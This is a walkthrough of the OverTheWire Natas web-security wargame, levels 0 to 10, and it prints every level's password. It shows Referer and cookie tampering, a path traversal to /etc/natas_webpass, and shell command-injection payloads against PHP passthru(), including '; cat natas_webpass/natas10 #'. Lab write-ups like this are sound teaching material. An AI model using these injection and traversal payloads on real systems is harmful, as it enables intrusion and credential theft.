# Writeups for Over The Wire Web Exploit

> Link to the place to do the challenges: https://overthewire.org/wargames/natas/

# Table of Contents

- [Writeups for Over The Wire Web Exploit](#writeups-for-over-the-wire-web-exploit)
- [Table of Contents](#table-of-contents)
  - [Natas 0](#natas-0)
  - [Natas 1](#natas-1)
  - [Natas 2](#natas-2)
  - [Natas 3](#natas-3)
  - [Natas 4](#natas-4)
  - [Natas 5](#natas-5)
  - [Natas 6](#natas-6)
  - [Natas 7](#natas-7)
  - [Natas 8](#natas-8)
  - [Natas 9](#natas-9)
  - [Natas 10](#natas-10)
  - [Natas 11](#natas-11)

## Natas 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Here is the clue:

![Clue for Natas 0](images/Clue_0.png)

So we just need to right click the mouse and inspect the page for viewing the flag:

![Flag 0](images/Answer-0.png)

So, the flag is:

```
g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
```

## Natas 1

The details to login the natas 1 are:

```
Username: natas1
Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
URL:      http://natas1.natas.labs.overthewire.org
```

So, with the given clue, I know that the flag is in the source code but we can't inspect the page with rightclicking:

![Clue for Natas 1](images/Clue_1.png)

Instead of rightclicking, we can use the shortcut to inspect the source code:

```
Shift + Control + C
```

Here is the flag after I use the shortcut to inspect:

![Flag 1](images/Answer-1.png)

So, the flag is:

```
h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
```

## Natas 2

The details to login the natas 2 are:

```
Username: natas2
Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
URL:      http://natas2.natas.labs.overthewire.org
```

When entering the page, it said "There is nothing on this page".
So, we have to find another page by first viewing the source code:

![Clue for Natas 2](images/Clue_2.png)

I saw that there is a image in used "files/pixel.png" and I also see the folder "files".
I go to the link http://natas2.natas.labs.overthewire.org/files/ for viewing all the files in that directory and suprisingingly, I saw 2 files:

![Clue 2.1 for Natas 2](images/Clue_2.1.png)

Hmmm, then I saw the file user.txt is suspicious, and click it to view the file:

![Flag for Natas 2](images/Answer-2.png)

There is a small hint that tell all the following information is listed in the format "username:password". I see all the login credentials of natas3 and other people.
So, the flag from the above screenshot is:

```
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
```

## Natas 3

The details to login the natas 3 are:

```
Username: natas3
Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
URL:      http://natas3.natas.labs.overthewire.org
```

When going to the page, there is a small hint is commented in the source code:

![Clue for Natas 3](images/Clue_3.png)

So, if you have experienced enough in doing challenges then you will know this hint refer to the file robots.txt.
Then, I try to go to http://natas3.natas.labs.overthewire.org/robots.txt, and there is a small hint about the directory that won't be displayed or crawled on Google:

![Clue 3.1 for Natas 3 ](images/Clue_2.png)

Then, I access the URL http://natas3.natas.labs.overthewire.org/s3cr3t/, and we can see that there is a users.txt file which store the flag:

![Flag for Natas 3](images/Answer-3.png)

So, the flag from the above screenshot is:

```
tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
```

## Natas 4

The details to login the natas 4 are:

```
Username: natas4
Password: tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
URL:      http://natas4.natas.labs.overthewire.org
```

When I access the page, it appears like this as the hint:

![Clue for Natas 4](images/Clue_4.png)

Which mean that we have to be redirect from the URL http://natas5.natas.labs.overthewire.org/ to this page so that we can view.

In order to do that, we need to use Burp Suit and turn the intercept on. Then, I catch the request:

![Clue 4.1 for Natas 4](images/Clue_4.1.png)

Now I need to change the "Referer" part from :

```
Referer: http://natas4.natas.labs.overthewire.org/index.php
```

to

```
Referer: http://natas5.natas.labs.overthewire.org/index.php
```

Here is the full request after changing:

```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM0OnRLT2NKSWJ6TTRsVHM4aGJDbXpuNVpyNDQzNGZHWlFt
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas5.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

Then, we can get the flag. So, the flag is:

![Flag for Natas 4](images/Answer-4.png)

So, the flag from the above screenshot is:

```
Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
```

## Natas 5

The details to login the natas 5 are:

```
Username: natas5
Password: Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
URL:      http://natas5.natas.labs.overthewire.org
```

When I first visit the page, I saw the hint require us to log in first:

![Clue for Natas 5](images/Clue_5.png)

Normally, we store the login information as cookies in our personal devices. So, let's check the the cookie that we store for this page:

![Clue 5.1 for Natas 5](images/Clue_5.1.png)

So, we can see that the cookie named loggedin is currently storing value of 0 (Which is usually known for not logged in). Let's change it to 1 (Which is usually known for logged in or positive condition) and we can get the flag after reloading the page:

![Flag for Natas 5](images/Answer-5.png)

So, the flag from the above screenshot is:

```
fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
```

## Natas 6

The details to login the natas 6 are:

```
Username: natas6
Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
URL:      http://natas6.natas.labs.overthewire.org
```

When I first view the web page, I saw a input field and a link where we can see the source code:

![Clue for Natas 6](images/Clue_6.png)

Then, I view the source code for this file:
![Clue 6.1 for Natas 6](images/Clue_6.1.png)

Then I see that it include a secret.inc file (This is a suspicious name).
I also saw that it need to compare the input we entered in the field and the variable $secret. So, the variable secret maybe is stored in the file secret.inc.
Then, I go to the URL http://natas6.natas.labs.overthewire.org/includes/secret.inc and I can see the variable $secret is defined:

![Clue 6.2 for Natas 6](images/Clue_6.2.png)

Now, I go back to the page where the input field is shown and enter the payload:

```
FOEIUWGHFEEUHOFUOIU
```

Then, I get the flag:

![Flag for Natas 6](images/Answer-6.png)

So, the flag from the above screenshot is:

```
jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
```

## Natas 7

The details to login the natas 7 are:

```
Username: natas7
Password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
URL:      http://natas7.natas.labs.overthewire.org
```

When I view the source code of this challenge, I notice 2 things:

- The web content is called by GET method using params in URL
- The hint said that the password for web user natas 8 is in /etc/natas_webpass/natas8

![Clue 7 for Natas 7](images/Clue_7.png)

So, we just simply change the URL a little bit from:

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

to

```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```

So, the flag appears as the content of the web page:

![Flag for Natas 7](images/Answer-7.png)

So, the flag from the above screenshot is:

```
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
```

## Natas 8

The details to login the natas 8 are:

```
Username: natas8
Password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
URL:      http://natas8.natas.labs.overthewire.org
```

First, when I vit the page, I saw the input field and also the view source code link. Let's view the source code of this challenge:

![Clue for Natas 8](images/Clue_8.png)

It seems like the input value will be go through function encodeSecret() to decrypt it and compare with the variable \$encodedSecret. So, now, if we want to get the flag we need to write the PHP code for decrypt the variable \$encodedSecret to enter to the input field.

Let's use the [PHP compiler online](https://www.programiz.com/php/online-compiler/) and use this code to decrypt the variable:

```PHP
<?php
function decodeSecret($encodedSecret) {
    // Reverse the base64 encoding and convert hexadecimal to binary
    $decodedBinary = base64_decode(strrev(hex2bin($encodedSecret)));
    // Convert binary to string
    $decodedSecret = utf8_decode($decodedBinary);
    return $decodedSecret;
}

$encodedSecret = "3d3d516343746d4d6d6c315669563362";
$decodedSecret = decodeSecret($encodedSecret);

echo "Decoded Secret: $decodedSecret";

?>
```

The result we get by using the above code is:

```
Decoded Secret: oubWYf2kBq
```

Let's enter the payload that we just get into the input field and get the flag:

![Flag for Natas 8](images/Answer-8.png)

So, the flag that we get is:

```
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
```

## Natas 9

The details to login the natas 9 are:

```
Username: natas9
Password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
URL:      http://natas9.natas.labs.overthewire.org
```

First, when I first view the page, I can see that there is a input field with a show source code link. Now, let's inspect the source code:

![Clue for Natas 9](images/Clue_9.png)

The interesting part is this part of the code:

```php
<form>
  Find words containing:
  <input name=needle>
  <input type=submit name=submit value=Search>
  <br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
  $key = $_REQUEST["needle"];
}

if($key != "") {
  passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

The [passthru()](https://www.php.net/manual/en/function.passthru.php) function won't check any validations on the input so that this code won't care what the user can do on the system.

So, this system can be OS injection. Normally, the password file in linux is stored in /etc/passwd so, we will try to get in the folder /etc/ first.

Now, let's get our hand dirty with injecting the payload in to the input field:

```shell
; pwd #
```

And the result I get is

```shell
/var/www/natas/natas9
```

This code will let us know where we are in the current system, and ignore the remain code.

Now there are 2 ways to solve this problem:

- Long way: cd to the /etc/ directory and then try to look over files
- Short way: stand in the current directory and cat the files from /etc/

I will perform the Long way solve for this one. Then, I will inject the payload:

```shell
; cd ../../../../ ; cd /etc/ ; ls #
```

Then, you can see all the files in the /etc/ directory. He ae files or directories that I feel suspicious:

```
natas_pass
natas_webpass
passwd
```

I have tried to cat file natas_pass but it is blank. Let's move to natas_webpass. I tried to cat it first but it is blank so it may be a directory so I use this command:

```shell
; cd ../../../../ ; cd /etc/ ; cd natas_webpass ; ls #
```

Surprisingly, I can find all the folders/files in this directory /etc/natas_webpass. Then I tried with the payload

```shell
; cd ../../../../ ; cd /etc/ ; cat natas_webpass/natas10 #
```

And here is the result:

![Flag for Natas 9](images/Answer-9.png)

So, the flag I get from the above screenshot is:

```
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
```

## Natas 10

The details to login the natas 10 are:

```
Username: natas10
Password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
URL:      http://natas10.natas.labs.overthewire.org
```

This challenge is quite similar to the last one, but now they add filter. Let's view the source code:

![Clue for Natas 10](images/Clue_10.png)

The interesting part is this code:

```php
For security reasons, we now filter on certain characters
<br/><br/>
<form>
  Find words containing:
  <input name=needle>
  <input type=submit name=submit value=Search>
  <br><br>
</form>

Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
  $key = $_REQUEST["needle"];
}

if($key != "") {
  if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
  } else {
    passthru("grep -i $key dictionary.txt");
  }
}
?>
</pre>
```

They have filtered all the special characters so that we have to find another way. I have research for the grep usage and how it is normally used:

```shell
grep [OPTION...] PATTERNS [FILE...]
```

So, I want to run the command in order to search for characters in the file password for natas11:

```shell
grep -i a /etc/natas_webpass/natas11
```

So, the payload I will use for injection is:

```
a /etc/natas_webpass/natas11
```

or

```shell
.* /etc/natas_webpass/natas11
```

Here is the result:

![Flag for Natas 10](images/Answer-10.png)

So, the flag I get from the above image is:

```
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
```

## Natas 11

The details to login the natas 11 are:

```
Username: natas11
Password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
URL:      http://natas11.natas.labs.overthewire.org
```
